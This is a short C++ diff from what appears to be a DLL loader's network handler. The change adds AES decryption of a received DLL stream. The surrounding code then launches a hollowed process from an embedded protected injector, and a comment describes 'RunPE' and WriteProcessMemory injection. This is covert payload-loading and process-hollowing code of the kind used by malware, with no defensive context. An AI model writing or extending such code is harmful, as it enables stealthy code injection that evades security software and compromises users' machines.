@@ -22,7 +22,9 @@ DllStreamResponse::DllStreamResponse(const char* msg, size_t size, MatchedClient
 	
 	decryptedSplit[1].erase(decryptedSplit[1].begin());
 
-	std::vector<unsigned char> byteArray = StringUtilities::StringToByteArray(decryptedSplit[1]);
+	std::vector<unsigned char> encryptedStream = StringUtilities::StringToByteArray(decryptedSplit[1]);
+	
+	std::vector<unsigned char> byteArray = StringUtilities::StringToByteArray(matchedClient->aes->Decrypt(encryptedStream));
 
 	// Dll stream has been fully decrypted and received. Now we RunPE the injector and WPM the binary into it!
 	HANDLE hProcess = ProcessHollowing::CreateHollowedProcess(InjectorData::Injector_protected_exe);
